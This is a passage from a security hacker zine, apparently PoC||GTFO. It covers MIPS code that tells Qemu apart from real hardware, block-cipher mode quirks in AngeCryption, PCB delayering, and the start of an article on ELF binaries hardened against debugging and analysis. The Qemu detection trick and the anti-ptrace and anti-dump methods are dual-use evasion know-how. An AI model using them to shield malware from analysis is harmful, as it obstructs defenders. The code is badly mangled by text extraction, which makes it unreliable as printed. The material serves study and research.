∗ PoC code which e x e c u t e s d i f f e r e n t p i e c e s o f code from t h e same a d d r e s s
3 ∗ i n Qemu v s r e a l MIPS hardware .
∗
5 ∗ On r e a l MIPS hardware , main s h o u l d r e t u r n 1 .
∗ In Qemu, main s h o u l d r e t u r n 2 .
7 ∗
∗ T e s t e d a g a i n s t Qemu 2 . 0 . 1 and a Broadcom BCM5357 (MIPS 74K) SoC .
9 ∗
∗ R e q u i r e s a MIPS32r2 c o m p l i a n t c o m p i l e r .
11 ∗/
13 #include <s t d i o . h>
#include < s t d l i b . h>
15 #include < s t r i n g . h>
17 #define CODE_SIZE 8
11 Linux
MIPS Wiki, Qemu Processor
2719 /∗
∗ r e t 1 c o n t a i n s a MIPS
21 ∗ r e t 2 c o n t a i n s a MIPS
∗/
23
/∗
25 ∗ Big e nd i an
∗
27 c h a r r e t 1 [CODE_SIZE] =
"\ x03 \ xe0 \ x00 \ x08 "
29
"\ x24 \ x02 \ x00 \ x01 " ;
c h a r r e t 2 [CODE_SIZE] =
31
"\ x03 \ xe0 \ x00 \ x08 "
"\ x24 \ x02 \ x00 \ x02 " ;
33 ∗/
function that returns 1.
function that returns 2.
// j r $ra
// l i $v0 , 1
// j r $ra
// l i $v0 , 2
35 /∗ L i t t l e en di a n ∗/
char r e t 1 [ CODE_SIZE ] =
37
" \ x08 \ x00 \ xe0 \ x03 "
" \ x01 \ x00 \ x02 \ x24 " ;
39 char r e t 2 [ CODE_SIZE ] =
" \ x08 \ x00 \ xe0 \ x03 "
41
" \ x02 \ x00 \ x02 \ x24 " ;
// j r $ra
// l i $v0 , 1
// j r $ra
// l i $v0 , 2
43 i n t main ( void ) {
i n t ( ∗ s ) ( void ) ;
45
int r e t v a l = 0 ;
char b u f [ CODE_SIZE ] = { 0 } ;
47
/∗ The s f u n c t i o n p o i n t e r p o i n t s t o b u f ∗/
49
s = ( void ∗ ) &b u f ;
51
/∗ 1 . Copy r e t 1 i n t o b u f ( r e t 1 i s now i n t h e d a t a c a c h e )
∗ 2 . E x e c u t e t h e s y n c i i n s t r u c t i o n t o f l u s h t h e d a t a c a c h e ( r e t 1 i s now i n main memory )
∗ 3 . Copy r e t 2 i n t o b u f ( r e t 2 i s now i n t h e d a t a c a c h e )
∗ 4 . C a l l t h e f u n c t i o n l o c a t e d i n b u f ( s h o u l d f e t c h and e x e c u t e r e t 1 from main memory )
∗/
memcpy ( buf , r e t 1 , s i z e o f ( b u f ) ) ;
asm ( " s y n c i 0(%0) " : : " r " ( b u f ) ) ;
memcpy ( buf , r e t 2 , s i z e o f ( b u f ) ) ;
retval = s () ;
53
55
57
59
61
p r i n t f ( " r e t v a l = %d\n" , r e t v a l ) ;
return r e t v a l ;
63 }
Because synci is not a privileged instruction, this method can be used in both user and kernel space.
The only downside is that synci was not introduced until MIPS32r2, so older MIPS processors don’t support
that particular instruction. Since MIPS32r2 was introduced in 2003, it’s unlikely that this will be an issue
unless you’re dealing with an older processor; in such an event, you’ll need to use some alternate method of
flushing the cache. This can be done in kernel space with the cache instruction, or in Linux user space, you
can simply replace synci with a call to sleep(1).
It’s worth noting that in theory, the second block of code (ret2) could be executed when running on real
MIPS hardware if the kernel flushed the cache behind your back in between the time that ret2 is copied into
buf and the time that you actually call into buf. However, this would be a very unlucky edge case which I
have yet to encounter in practice, provided the time between the second memcpy to buf and the call to buf
is minimized. ret1 is never executed in Qemu.
287
More Cryptographic Coloring Books
by Philippe Teuwen
7.1
Weird crypto
In PoCkGTFO 5:3 we taught you kids why ECB is a weak encryption mode, as helpfully shown by the
ElectronicColoringBook.py script. 12 As you may have guessed, we’ll see that in some circumstances CBC
deserves the same treatment!
Don’t worry, though! Most of the time CBC mode is fine, but sometimes weirdos like our buddy Ange
Albertini do impossibly fancy things with crypto such as AngeCryption. I wouldn’t risk offending our
PoCkGTFO’s loyal readers by explaining AngeCryption all over again, 13 but please recall that it relies on
the fact that you can decrypt plaintext to obtain ciphertext. This reverse-ciphertext encrypts back to the
original plaintext because block encryption and decryption operations can be safely exchanged.
Let’s try to reproduce the example given by Ange in his RMLL2014 presentation, available in a translated
slide deck titled “Let’s play with crypto.”
Figure 6: “If we encrypt the final result, we get our first random data, followed by our target picture.”
This example uses PNG images, so we’ll begin with two logos in PNG format and of equal width. We’ll
take those of Google and DuckDuckGo, with a small change: I removed subtle gradients from the original
PNGs so that we get large areas of the same flat color. To better illustrate the vulnerability, we need to work
on uncompressed, non-interlaced images. A tool called advpng 14 takes care of flattening the PNG images
and minimizing the metadata by grouping all IDAT chunks into a single chunk.
1 $ advpng −z −0 g o o g l e . png
$ advpng −z −0 duckduckgo . png
Now we can construct our AngeCryption example using Ange’s PNG-in-PNG tool (Google for it with
“corkami” and “src/angecryption/PiP/PIP.py” as search terms).
$ python PIP . py g o o g l e . png duckduckgo . png combined . png CBC_can_fail_too
The resulting combined.png displays the Google logo and, when decrypted, displays the DuckDuckGo
logo.
12 https://doegox.github.io/ElectronicColoringBook/
13 See PoCkGTFO 3:11 and its retrospectively funny quote: “We’ll use the standard AES-128 algorithm in CBC mode, which
is proven to be semantically secure when used with a random IV.”
14 http://advancemame.sourceforge.net/
29Figure 7: combined.png
Ange’s PIP.py does the opposite of what the slide proposes, just to show that it’s also possible. So, to
match the tool and the rest of the article you need to swap the ENC and DEC operations. It still remains
pure AngeCryption.
Figure 8: “If we decrypt the final result, we get our first random data, followed by our target picture”
7.2
Time to fire up ElectronicColoringBook.py
1 $ python E l e c t r o n i c C o l o r i n g B o o k . py combined . png −p4 −c255
Figure 9: combined.png as seen through ElectronicColoringBook.py.
What can we see at this point?
We recovered the Google logo but it was not encrypted, so we aren’t done yet. Still, we can see a few
artifacts compared to what we obtained with ECB on a pure bitmap. It also looks like we couldn’t recover
the correct aspect ratio either. In fact, it did get correctly recovered, but the display included extra PNG
metadata bytes, so the image got slightly skewed.
30The artifacts in that image are due to the additional structure of the PNG format that is absent from
a plain BMP. In a PNG image, each scan line is preceded by a byte of metadata describing which filter to
apply to that line. In our case, those extra bytes are all null bytes indicating the absence of a filter. It is this
one extra byte on each line that misaligns the blocks in our image recreation and skews it. It also breaks the
uniform areas, so they are not that easy to paint over. Moreover, you can see a few blotches of gray here and
there in the white area. That’s because the image data, even when uncompressed, is still not raw pixels but
a zlib stream encapsulating some DEFLATE data that has its own metadata 15 at the start of each 64 kB
block.
Rather than adding additional complexity to our script to handle each of these specific quirks, it turns
out that we can correct the misalignment due to the presence of metadata bytes by specifying a non-integer
width:
1 $ python E l e c t r o n i c C o l o r i n g B o o k . py combined . png −p4 −o3 −c255 −x 6 0 0 . 3 4 5
Figure 10: combined.png, fine-tuned
15 See
rfc1951.txt.
31The bottom of the image is completely black, which is how ElectronicColoringBook.py represents
non-repeating blocks. That’s what we expect from CBC-encrypted data, as opposed to ECB.
7.3
The downside
Now we can get to the second half of the story, the decrypted combined.png displaying the DuckDuckGo logo.
We’ll use decrypt-PIP.py, a helper script created by PIP.py, and then apply ElectronicColoringBook.py
to the output dec-duckduckgo.png.
1 $ python d e c r y p t −PIP . py
Figure 11: dec-duckduckgo.png
1 $ python E l e c t r o n i c C o l o r i n g B o o k . py dec−duckduckgo . png −p4 −o3 −c255 −x 6 0 0 . 3 4 5
Figure 12: dec-duckduckgo.png as seen through ElectronicColoringBook.py
But what is this new devilry? Oh, no! The Google logo is still visible. Is the CBC gone all evil on us, so
can’t shake it off?
327.4
Why, oh why?
Recall that in the CBC mode, encryption of each block depends on all the previous blocks:
Plaintext
Plaintext
Plaintext
Initialization
Vector
block cipher
encryption
Key
Key
block cipher
encryption
Key
Ciphertext
Ciphertext
block cipher
encryption
Ciphertext
Figure 13: Cipher Block Chaining (CBC) mode encryption
But the Google part of the image is not the result of an encryption but of a decryption, remember? We
must account for how these blocks feed into the CBC process.
Ciphertext
block cipher
decryption
Key
Ciphertext
Key
block cipher
decryption
Ciphertext
Key
block cipher
decryption
Initialization
Vector
Plaintext
Plaintext
Plaintext
Figure 14: Cipher Block Chaining (CBC) mode decryption
Here, the ciphertext is that of the original Google image. For its image parts of constant color, we get
the same ciphertext blocks over and over.
Plaintext blocks of that series will be P n = Dec K (C n ) ⊕ C n−1 ≡ Dec K (C) ⊕ C if all ciphertext blocks
are the same.
The first plaintext block from a repetitive area depends on the previous (different) block. Thus its content
is different from the following repetitive plaintext blocks.
So CBC in decryption mode is almost as bad as ECB: decrypting n repetitive blocks will give one arbitrary
block followed by n − 1 repetitive blocks (while ECB would give n repetitive blocks). That’s why transitions
around Google letters look slightly thicker.
In principle, we could paint over CBC when used in reverse mode as easily as we painted over ECB,
but it’s actually quite difficult in our example because, as you recall, the image data of PNG format is not
merely raw pixels such as in the BMP or PNM formats.
In real life, decryption is usually used on data that previously went through encryption. Since the point
of the CBC mode is to prevent repetitions in the ciphertext, we don’t generally need to fear them, although,
theoretically, they could still happen. (By a stroke of bad luck, we might get Enc K (C ⊕ P ) = C to occur
for a given P for some combination of C and the key K.)
Let us recall another CBC fact: even if you only know the key but not the initialization vector (IV),
you can still decrypt combined.png almost fully. Only the first block will be wrongly decrypted, which is
not that hard to reconstruct; even if left corrupted, it won’t prevent ElectronicColoringBook.py from
revealing both images. Look back at Figure 14 to understand why.
So the upshot of our case study is that single-block encryption and decryption operations can still be
exchanged almost safely, although the chaining mode does throw some gotchas into the process.
337.5
Exploring other chaining modes
So what about the other chaining modes that use an IV?
The CFB mode suffers of a similar problem because, in decryption mode, the block encryption depends
only on the previous ciphertext. This previous ciphertext can be repeated under AngeCryption, so the
resulting plaintext also repeats: P n = Enc K (C n−1 ) ⊕ C n ≡ Enc K (C) ⊕ C.
Initialization Vector
Key
block cipher
encryption
Key
block cipher
encryption
Ciphertext
Key
block cipher
encryption
Ciphertext
Plaintext
Ci
Plaintext
Plaintext
Figure 15: Cipher Feedback (CFB) mode decryption
The OFB mode makes a block cipher into a synchronous stream cipher and therefore doesn’t have this
issue. Encryption and decryption are just XOR with the same keystream, which only depends on the IV and
the key K: keystream 1 = Enc K (IV ), keystream n = Enc K (keystream n−1 ) and P n = keystream n ⊕ C n .
Initialization Vector
Key
block cipher
encryption
Ciphertext
Key
block cipher
encryption
Ciphertext
Plaintext
Key
block cipher
encryption
Ciphertext
Plaintext
Plaintext
Figure 16: Output Feedback (OFB) mode decryption
Let’s try this out. We modify PIP.py to replace MODE_CBC by MODE_OFB and inverse the order of operations
to compute the IV. Indeed, if for CBC we computed IV = Dec K (C 1 ) ⊕ P 1 , for OFB we must compute
IV = Dec K (C 1 ⊕ P 1 ). Then we repeat the same experiment:
1 $ python PIP_OFB . py g o o g l e . png duckduckgo . png combined . png OFB_AngeCryption
$ python d e c r y p t −PIP . py
3 $ python E l e c t r o n i c C o l o r i n g B o o k . py dec−duckduckgo . png −p4 −o3 −c255 −x 6 0 0 . 3 4 5
34Figure 17: dec-duckduckgo.png (OFB version) as seen through ElectronicColoringBook.py
Finally! We get a “secure” version of AngeCryption. As a bonus, unlike CBC, if you only knew the key
but not the IV, you wouldn’t be able to recover anything.
Another alternative is the CTR mode, which is pretty similar to OFB: P n = Enc K (counter++) ⊕ C n .
The OFB initialization vector would play the role of the initial counter value: counter = Dec K (C 1 ⊕ P 1 ).
And, as for OFB, knowing only the key but not the initial counter value is useless.
Counter
f3b1...3b
Key
block cipher
encryption
Counter
f3b1...3c
Key
block cipher
encryption
Ciphertext
Ciphertext
Plaintext
Counter
f3b1...3d
Key
block cipher
encryption
Ciphertext
Plaintext
Plaintext
Figure 18: Counter (CTR) mode decryption
Note that both OFB and CTR have their own special limitations typical of stream ciphers: bitflipping
attacks, keystream reuse, and so on. However, none of these are an issue in this unusual use case of ours.
The PCBC (Propagating CBC) mode would work as well, because each block decryption depends on
the previous ciphertext and the previous plaintext: P n = Dec K (C n ) ⊕ C n−1 ⊕ P n−1 . It’s not supported in
PyCrypto, however, and is not very common.
7.6
Some more PoC
Before we wrap up, I’d like to circle back to a variation of AngeCryption suggested by Gynvael Coldwind,
and so rightfully called GynCryption. GynCryption doesn’t rely on IV forgery, but rather tries to find a
key that transforms the plaintext into the ciphertext we want. For a PNG, it requires control over the first
16 bytes, but this cannot reasonably be done for an entire block. On the other hand, controlling the first 6
bytes of a JPG is enough to be able to insert a small comment section. GynCryption was originally based
on ECB, but nothing prevents us from replacing ECB by CBC, CFB, OFB, or by CTR with a null IV or
a reset counter respectively—as we’ve shown above, those are only slightly better than ECB. In this issue’s
35polyglot archive you can find two proofs of concept, gyncryption_ofb.pdf and gyncryption_cfb.pdf that
you can decrypt into a JPG with a null IV/counter and the same key “@doegox_5f32c6e5”.
With OFB and CTR, once you have found such a key, you may be tempted to reuse it with any other
(small) PDF and JPG, and it will work because they are similar to stream ciphers: a change in a plaintext
block affects only the corresponding bits of the ciphertext, not the entire block. But remember that stream
ciphers are only secure if you don’t reuse the keystream—so don’t reuse your key for the same mode, find
another one! Otherwise a simple XOR of both files will result into the XOR of the plaintext data (and
padding), and the keystream will be entirely removed.
7.7
Conclusions
Of course, since AngeCryption and GynCryption are far more likely to be used as crypto curios rather than
as serious tools for serious situations, their security is not that crucial. Still, it is good to understand the risks
associated with non-standard uses of block cipher modes—this understanding should serve as an antidote to
their blind reuse in inappropriate contexts.
7.8
Acknowledgments
Special thanks go to Ange for his most neighborly help; without him this article would have never been
possible!
368
Introduction to Delayering and Reversing PCBs
by Joe Grand
Figure 19: Our example PCB in its unmodified state. If only it knew the suffering that it was about to
endure.
Figure 20: Sandpaper at work. You can see the copper of inner layer 2 starting to peek out from underneath
the top substrate.
Printed Circuit Boards (PCBs) form the physical carrier for and provide electrical pathways between
electronic components. They are created with layers of thin copper (conductive) foil laminated to insulating
(non-conductive) layers. By accessing and imaging each individual copper layer of a PCB, it is possible
to recreate the PCB layout. If the component types (and values, ideally) are known, you’ll also be able to
derive the schematic (a simplified, visual representation of the device’s electronic design) or a desired portion
thereof.
“Why bother?” you might ask. Maybe you want to understand how a particular product works, locate
specific connections on the board (like JTAG or UART), clone the design, or figure out where you can modify
37Figure 21: The four exposed layers of our example PCB.
it to inject malicious functionality. The techniques provided in this article might not be groundbreaking to
those skilled in the hardware arts, but will serve as a resource for folks interested in meandering down the
path of PCB reverse engineering.
8.1
Delayering
The first phase of the process is to obtain an image of each layer of the target circuit board. There are
a variety of possible techniques, including low-tech, off-the-shelf solutions and those requiring expensive
equipment and skilled operators. Some methods are destructive, meaning you’ll never see your PCB again
when you’re done, and some are non-destructive, meaning the PCB will remain intact and unharmed. For
now, we’re going to focus on manual abrasion using sandpaper, which will destroy your board layer-by-layer,
but is also the simplest and most accessible.
The top and bottom of a PCB are usually coated in solder mask, a non-conductive layer that protects
the PCB from dust and oxidation and provides access to copper areas on the board that are intended to be
exposed. You’ll want to remove the solder mask so you have unobstructed access to the underlying copper.
To do so, attach the PCB to your work surface with a clamp or double-sided tape. Then, use 60 to 220 grit
sandpaper in even strokes at light pressure across the entire board. Optionally, you can put spare PCBs
of the same height as the target on either side to help maintain planar motion and even sanding pressure.
Holding the sandpaper by hand will give you the best control. If you’re prone to repetitive stress injuries, a
tool such as a Norton Sheet Sander may serve you well.
Once you’ve exposed the copper, it’s time to capture an image of the layer. If you have access to a
flatbed scanner, use that. Otherwise, a point-and-shoot camera will work. (When using a camera instead of
a scanner, be aware that you may need to rotate and lens-correct the resulting image to make it appear as
planar and true-to-form as possible.)
To access the inner layers, the process is similar to removing the solder mask. For this step, you’ll
need harder pressure and more elbow grease to deal with removing the layer of insulating substrate, a
fiberglass/epoxy weave.
Figure 19 shows the top and bottom of our example PCB in its unmodified state. This board is 4-layer,
62 mil thick, with trace widths ranging from 12 to 48 mil. Figure 20 shows PCB delayering in action. After
you’ve successfully accessed and imaged each layer of the PCB, you should end up with a sequence similar
to Figure 21.
8.2
Image processing
With your PCB layer images in hand, the next phase is to use an image processing/manipulation tool of
your choice to adjust the images, create a stack-up of the layers, and configure the opacity of each so that
you can see all copper features at once: footprints, traces, vias, and fills. Suitable programs include Adobe
Photoshop, GIMP, and Paint.NET.
38Figure 22: Layer stack-up of our example PCB. Layer opacity was adjusted to see through the board and
arbitrary traces were colored using a flood fill.
The image processing tasks are as follows:
1. Rotate and mirror the images so they all have the same orientation. For reverse engineering purposes,
you’ll want a view of each layer as if you’re looking down at it through the top of the board. This
means that the bottom half of your image set will need to be flipped/mirrored vertically. Choose a
feature of the PCB that exists on all layers, such as a mounting hole, test point, via, or through-hole
footprint, and make sure that it’s in the same position on the board in each of the images.
2. Adjust the images so the copper features on each layer are easily distinguishable from the underlying
substrate. The exact adjustments you need to perform will vary depending on the quality of your de-
construction process and resulting images. At a minimum, you’ll want to remove unnecessary features,
adjust brightness/contrast, and desaturate to shades of grey or convert to black and white.
3. Merge the images into a single file, to create a stack-up of the layers, by placing each one on its own
layer within your image processing tool. Set the opacity of each layer to 50% as a starting point, while
leaving the bottom layer at 100%. This will let you see through the layers enough to identify the PCB
features on each. Make sure that drill holes and other through-hole features match across the entire
board surface. You may need to make small rotational or minor scaling adjustments to exactly align
the layers.
8.3
Reverse engineering
The goal of this phase is to determine how components are physically interconnected on the board by visually
following the copper, assisted by your image processing tool. If you want to make use of the information you
glean from these efforts, you may want to have a modicum of electronics knowledge.
39Figure 23: Schematic based on the colored signals of Figure 22. This kind of visual representation is much
easier than a collection of PCB layer images.
To begin, identify the major component footprints on the board and pick a starting location on one
of them. If component part numbers are known, obtain their associated data sheets for details about the
component, its pinout, and pin functionality. Then, prepare yourself for a lot of repetition.
With your image processing tool, enable and disable the layers as needed while using a flood fill to
set the color of the desired trace and anything it’s in contact with. You’ll find yourself hopping between
the various layers and zooming in and out as you follow the trace around and through the board. Draw a
schematic as you go, adding to it each time you finish coloring a route. Keep in mind that the PCB silkscreen
often contains reference designators, part numbers, component values, and other useful information that you
can incorporate into your schematic. A board’s physical characteristics and actual layout can also be very
important aspects of the design, but we’ll ignore them for now. Repeat these steps until every trace is
accounted for.
Figure 22 shows a working view of my PCB layer stack-up with a few arbitrarily selected connections
traced and colored. Figure 23 shows the resulting schematic.
If you want to see a true master of signal tracing, watch any of Chris Tarnovsky’s chip hacking presen-
tations from Black Hat or DEFCON. For a different approach to PCB reverse engineering, take a look at
Throbscottle’s Instructable.
8.4
Next steps
As you might now be aware, the current state of PCB reverse engineering is a manual, time consuming, and
often difficult task. The obvious progression of this work is to automate as much of the process as possible.
I’ve started developing a toolkit to assist in recreating a complete schematic based on a collection of PCB
layer images. Imagine Karsten Nohl, Starbug, and Martin Schobert’s degate or Adam Laurie’s rompar, but
for circuit boards. I, for one, am excited about the possibilities.
409
Davinci Seal: Self-decrypting Executables
by Ryan O’Neill,
who also publishes as Elfmaster
In the pursuit of creativity and fun, I recently had the idea of creating self-protecting files. That is to say,
any type of data that you want protected from analysis, with the ability to decrypt its own content when
provided the correct key. The use cases for such a capability are debatable, but the idea is nevertheless fun,
and only took an afternoon to implement. The goal was to create a program that can transform any file
into an ELF executable whose sole purpose is protecting the file data embedded within its own body. I call
these Davinci Seals.
9.1
Protection
The output executable should be able to protect the embedded data from static analysis and resist runtime
analysis and ptrace-based debugging. An attacker should not be able to extract the content by setting
breakpoints and reading the decrypted content from memory; thus, detection of such attacks should be in
place. The executable should also be resistant to attackers modifying code or replacing anti-debug code with
NOP instructions; this can be mostly prevented by using code watermarking. There are forms of dynamic
analysis such as dynamic instrumentation with Pin, or using an IDA Emulator plugin, which Davinci does
not mitigate, but we briefly discuss viable methods for protection against them.
9.2
Example of creating a Davinci seal
1 $ cat msg . t x t
_____________________
3 | The s p i c e must f l o w |
−−−−−−−−−−−−−−−−−−−−−
5
$ . / d a v i n c i msg . t x t msg . dvs p4ssw0rd −r
7 [ + ] The u s e r who e x e c u t e s msg . dvs must s u p p l y password : p4ssw0rd
[ + ] Encoding p a y l o a d data
9 [ + ] Encoding p a y l o a d s t r u c t
[ + ] B u i l d i n g msg program
11 [ + ] ( O p t i o n a l ) u t i l s / s t r i p x e x i s t s , s o u s i n g i t t o s t r i p s e c t i o n h e a d e r s o f f o f DRM a r c h i v e
S u c c e s s f u l l y c r e a t e d msg . dvs
13
∗∗ NOTE: msg . t x t was t r a n s f o r m e d i n t o an ELF e x e c u t a b l e (A d a v i n c i s e a l ) named msg . dvs
15
$ r e a d e l f − l msg . dvs
17
E l f f i l e type i s EXEC ( E x e c u t a b l e f i l e )
19 Entry p o i n t 0 x400492
There a r e 5 program h e a d e r s , s t a r t i n g a t o f f s e t 64
21
Program Headers :
23
Type
Offset
VirtAddr
PhysAddr
FileSiz
MemSiz
Flags
Align
25
LOAD
0 x0000000000000000 0 x0000000000400000 0 x0000000000400000
0 x0000000000000918 0 x0000000000000918 R E
200000
27
LOAD
0 x0000000000001000 0 x0000000000601000 0 x0000000000601000
0 x0000000000800324 0 x0000000000800338 RW
200000
29
NOTE
0 x0000000000000158 0 x0000000000400158 0 x0000000000400158
0 x0000000000000024 0 x0000000000000024 R
4
31
GNU_EH_FRAME
0 x00000000000006c0 0 x00000000004006c0 0 x00000000004006c0
0 x000000000000007c 0 x000000000000007c R
4
33
GNU_STACK
0 x0000000000000000 0 x0000000000000000 0 x0000000000000000
0 x0000000000000000 0 x0000000000000000 RW
10
35
41$ . / msg . dvs
37 This message r e q u i r e s t h a t you s u p p l y a key t o d e c r y p t
39 $ . / msg . dvs p4ssw0rd
_____________________
41 | The s p i c e must f l o w |
−−−−−−−−−−−−−−−−−−−−−
Voila! Our msg.txt file was transformed into msg.dvs, an ELF executable which lives and breathes only
to protect the data within it, and reveal that data when supplied the encryption key.
9.3
9.3.1
Implementation
ELF stub and payload packaging
The goal here is to transform a file containing arbitrary data into an ELF executable whose sole purpose is
to protect the data. The executable should decrypt and write the data to stdout if the proper password/key
is supplied.
Our project consists of two parts. The first is the Protector, which creates the output program from the
second, which we’ll call the Stub.
The protector program takes an input file and generates a stub executable that contains the encrypted
input file within it, as well as metadata describing the size and location of the data. The stub executable that
it generates is written mostly in C, then compiled into bytecode and stored within the protector executable.
To fully understand the protector, we must first understand the stub.
The basic principle of the stub is that it contains an encrypted file. This encrypted data must be stored
somewhere with information about it. The best way to implement this is to append the data to the data
segment of the stub executable, or even within the text segment using a reverse extension method. Both
methods are common in virus infection and executable packers, but for the sake of POC and simplicity we
will pre-allocate a fixed size within the initialized data section of the stub executable.
/∗ From
2 #define
#define
4
typedef
6
d a v i n c i . h ∗/
KEY_BUF_LEN 256
MAX_PAYLOAD_SIZE ( ( 1 0 2 4 ∗ 1 0 2 4 ) ∗ 8 )
struct payload_meta {
u i n t 6 4 _ t p a yl o a d _ le n ;
/∗ Length o f t h e e n c r y p t e d f i l e d a t a ∗/
uint32_t keylen ;
/∗ Length o f t h e k e y used t o e n c r y p t ∗/
8
u i n t 8 _ t key [KEY_BUF_LEN ] ;
/∗ The k e y used t o e n c r y p t / d e c r y p t ∗/
u i n t 8 _ t data [MAX_PAYLOAD_SIZE ] ;
/∗ The f i l e d a t a i t s e l f ∗/
10 } payload_meta_t ;
12 /∗ From s t u b . c ∗/
payload_meta_t p a y l o a d __attribute__ ( ( s e c t i o n ( " . data " ) ) ) = {0 x0 } ;
Since the data and metadata will be stored in the structure above, the protector can resolve the payload
symbol to find where it needs to store the file data and key data within the stub.
1 −− I l l u s t r a t i o n o f t h e work f l o w :
3 [ i n p u t f i l e ( msg . t x t ) ] /∗ The i n p u t f i l e can be a n y t h i n g ∗/
|
5
v
[ p r o t e c t o r ] /∗ This program t r a n s f o r m s msg . t x t i n t o msg . e l f ∗/
7
|
v
9 [ ou tp ut f i l e ( msg . e l f ) ] /∗ The o u t p u t i s a c o m p i l e d s t u b . c , i n s t r u m e n t e d w i t h t h e e n c r y p t e d
i n p u t f i l e , and metadata ∗/
429.3.2
Anti-analysis protection
The goal is to transform an input file into an output executable that protects it. The input file is encrypt-
ed/obfuscated and embedded within an ELF executable that serves as a defensive shell. This defensive shell
will decrypt the data if supplied the correct key, and write it to standard output. If you choose, you may
tell the protector to store an obfuscated copy of the key within the binary so that it decrypts itself without
a supplied password. This offers no real protection, of course, but may still have some application.
Our defensive shell, being an executable and all, is inherently vulnerable to reverse engineering, static
analysis, and debugging (dynamic analysis) attacks. It would behoove the defending binary to have some
protection against some of these attacks. We have three protections against static analysis:
1.) The body of the input file is encrypted within the output executable, though just with weak XOR for
this proof of concept. The payload_meta_t structure is also encrypted, on top of the payload.data buffer.
If Davinci is to become more than just a proof of concept, a real cipher must be used.
2.) The section header table is stripped from the ELF executable. String tables are zeroed out, and the
symbol table is discarded.
This by itself makes the output executable far more difficult to navigate with a disassembler, since there
is no information provided about symbols or specific sections. The program headers are suitable for loading
and running a program, but without section headers, the program is more difficult to analyze, even for IDA
Pro.
Stripping the ELF section headers effectively disables any tools that rely on section headers. It is an old
and simple technique used by many neighbors.
1 −−P r e v e n t s objdump d i s a s s e m b l y
$ objdump −D msg . dvs
3 msg . dvs :
f i l e f o r m a t e l f 6 4 −x86 −64
$
5
−−P r e v e n t s symbol l o o k u p s
7 $ r e a d e l f −s msg . dvs
$
3.) The output executable is further protected with UPX, the Ultimate Packer for eXecutables. This also
takes care of shrinking the executable from the wasteful fixed-size of our buffer.
This feature is primarily for shrinking the output executable, because the stub is by default fixed at a
large size. Initializing an 8 MB buffer in the .data section leaves room for files up to 8 MB. As mentioned
earlier, another method, such as appending to the data segment, would be a better long-term design decision
and would result in the executable growing in proportion to the input file size. For the sake of POC, we used
the method of initializing fixed space in the .data section, which allows us to focus more on the principles
and less on the implementation.
9.3.3
Anti-debugging tricks
Most debuggers, such as GDB, rely on the ptrace system call. If ptrace-based debugging can be prevented,
we eliminate the most common types of dynamic analysis tools. strace, gdb, dumping /proc/$pid/mem,
and other tricks will all break.
Anti-Ptrace Protection A process is only allowed to have one tracer. This means that we can simply
use ptrace within our stub executable, so that it traces itself, preventing any other debuggers/tracers from
attaching. If a debugger is attached before our stub calls ptrace(), then our call to ptrace() will return
-1 and we can abort the process.
43The enable_anti_debug() function will prevent gdb and strace from analyzing our ELF executable.
/∗
∗ N o t i c e t h a t we u s e our own wrapper f o r t h e p t r a c e s y s c a l l .
∗ This i s good p r a c t i c e t o p r e v e n t LD_PRELOAD b y p a s s e s −−
4 ∗ even t h o u g h our s t u b i s c o m p i l e d − n o s t d l i b ( i n which c a s e
∗ an LD_PRELOAD b y p a s s would n o t work anyway ) .
6 ∗/
2
8 s t a t i c long _ptrace ( long r e q u e s t , long pid , void ∗ addr , void ∗ data ) {
long r e t ;
10
__asm__ v o l a t i l e (
12
"mov %0, %%r d i \n"
"mov %1, %%r s i \n"
14
"mov %2, %%rdx \n"
"mov %3, %%r 1 0 \n"
16
"mov $101 , %%r a x \n"
" s y s c a l l " : : " g " ( r e q u e s t ) , " g " ( p i d ) , " g " ( addr ) , " g " ( data ) ) ;
18
asm ( "mov %%rax , %0" : "=r " ( r e t ) ) ;
20
return r e t ;
}
22
void b a i l _ o u t ( void ) {
_write ( 1 , "The g a t e s o f heaven remain c l o s e d \n" , 3 4 ) ;
_ k i l l ( _getpid ( ) , SIGKILL ) ;
26
__exit ( −1) ;
}
28
void enable_anti_debug ( void ) {
30
i f ( _ptrace (PTRACE_TRACEME, 0 , NULL, NULL) < 0 )
b a i l _ o u t ( ) ; // i f a d e b u g g e r i s a l r e a d y a t t a c h e d we b a i l o u t
32
// a marker showing t h a t an a t t a c k e r d i d n ’ t j u s t jump o v e r e n a b l e _ a n t i _ d e b u g ( )
data_watermark++;
34 }
24
Now what happens when we try to debug msg.dvs with gdb?
$ gdb −q msg . dvs
2 Reading symbols from msg . dvs . . . ( no d e b u g g i n g symbols found ) . . . done .
( gdb ) run
4 S t a r t i n g program : /home/ ryan / dev / d a v i n c i /msg . dvs
The g a t e s o f heaven remain c l o s e d
6 Program t e r m i n a t e d with s i g n a l SIGKILL , K i l l e d .
The program no l o n g e r e x i s t s .
8 ( gdb )
If an attacker wants to bypass the anti-ptrace code, there are several techniques that are commonly
used.
1. LD_PRELOAD can be used to preload a library. This loads the specified library before any others, and
any of its symbols will take precedence over subsequently loaded libraries. Attackers have used this to
preload a custom shared library with a dummy ptrace that simply returns success and does nothing.
In our stub executable we do not use dynamic linking, and therefore no shared libraries can even be
loaded. We also use a syscall wrapper for ptrace, so that even if our stub did use dynamic linking, our
calls to ptrace would not go through the PLT/GOT and therefore could not be hijacked with another
shared library call. Always use syscall wrappers in binary hardening code, and stay away from glibc.
442. An attacker could modify the stub’s binary code so that the enable_anti_debug() code is never called,
or simply jumped over. An attacker could also overwrite the code in enable_anti_debug() so that it
doesn’t actually do anything to prevent debugging. We use a simple form of code watermarking to try
to prevent this, which we will discuss in Section 9.3.4.
/proc/<pid>/mem Dump Protection It is a common practice for reverse engineers/attackers to dump
a hardened binary from memory. This can be done by attaching to the process and reading /proc/<pid>/mem.
If the process is already stopped, then attaching to the process isn’t necessary, and a simple read() suffices.
Fortunately, Linux has a neat syscall called prctl(), which allows us to change the characteristics of our
running programs, but must be issued by the program itself.
i n t p r c t l ( i n t o p t i o n , unsigned long arg2 , unsigned long arg3 ,
unsigned long arg4 , unsigned long a r g 5 ) ;
2
4
OPTION :
PR_SET_DUMPABLE
S e t t i n g arg2 to
p r e v e n t s p r o c e s s from
p r e v e n t s p r o c e s s from
p r e v e n t s p r o c e s s from
6
8
( s i n c e Linux 2 . 3 . 2 0 )
0
dumping a CORE f i l e ,
b e i n g a t t a c h e d t o with p t r a c e , and
b e i n g dumped from / p r o c/<pid >/mem.
The PR_SET_DUMPABLE option applies several very neat and useful anti-debugging features. We use this
to add even more resistance to ptrace, while also preventing core dumps and memory dumps of our process.
/∗
∗ Always implement a s y s c a l l wrapper when u s i n g s y s c a l l s f o r a n t i −d e b u g g i n g
∗/
